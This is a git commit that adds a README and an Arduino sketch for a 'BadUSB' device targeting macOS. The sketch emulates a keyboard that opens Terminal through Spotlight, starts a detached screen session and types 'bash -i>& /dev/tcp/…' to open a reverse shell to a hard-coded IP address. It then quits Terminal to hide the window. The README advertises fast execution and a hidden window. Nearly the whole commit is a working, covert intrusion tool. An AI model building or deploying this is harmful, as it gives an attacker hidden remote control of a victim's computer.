22b67f9edea7c7cb79d15a44dfb6f0efb69d9e80
LzSkyline <lzskyline@foxmail.com>
2021-05-08 15:00:06 +0800

    init.

---
+++ README.md
@@ -0,0 +1,11 @@
+# BadUsb Reverse Shell for Mac
+
+兼容中文输入法, 秒级执行, 窗口隐藏
+
+Just for fun.
+
+# Reference
+
+https://www.arduino.cc/en/Reference/KeyboardModifiers
+
+https://cloud.tencent.com/developer/article/1480567
---
+++ mac_reverse_shell.ino
@@ -0,0 +1,53 @@
+#include<Keyboard.h>
+void setup() {
+  // 打开terminal
+  Keyboard.begin();//开始键盘通讯
+  delay(3000);
+  Keyboard.press(KEY_LEFT_GUI);//win键
+  delay(200);
+  Keyboard.press(' ');
+  delay(200);
+  Keyboard.release(KEY_LEFT_GUI);
+  Keyboard.release(' ');
+  delay(200);
+  Keyboard.press(KEY_CAPS_LOCK);
+  Keyboard.release(KEY_CAPS_LOCK);
+  delay(200);
+  Keyboard.print("TERMINAL.APP");
+  delay(300);
+  Keyboard.println();
+  Keyboard.println();
+  delay(200);
+  Keyboard.press(KEY_CAPS_LOCK);
+  Keyboard.release(KEY_CAPS_LOCK);
+
+  // 执行反弹shell
+  Keyboard.println(" screen");
+  Keyboard.println("");
+  Keyboard.println(" bash");
+  Keyboard.println("");
+  delay(200);
+  Keyboard.println(" bash -i>& /dev/tcp/10.252.211.241/12354 0>&1");
+  Keyboard.press(KEY_LEFT_CTRL);
+  delay(200);
+  Keyboard.press(' ');
+  delay(200);
+  Keyboard.release(KEY_LEFT_CTRL);
+  delay(200);
+  Keyboard.release(' ');
+  Keyboard.println(" bash -i>& /dev/tcp/10.252.211.241/12354 0>&1");
+  delay(200);
+  Keyboard.println();
+  Keyboard.press(KEY_LEFT_GUI);//win键
+  delay(200);
+  Keyboard.press('q');
+  Keyboard.release(KEY_LEFT_GUI);
+  Keyboard.release('q');
+  Keyboard.println("");
+  
+
+  Keyboard.end();//结束键盘通讯
+}
+void loop()//循环
+{
+}
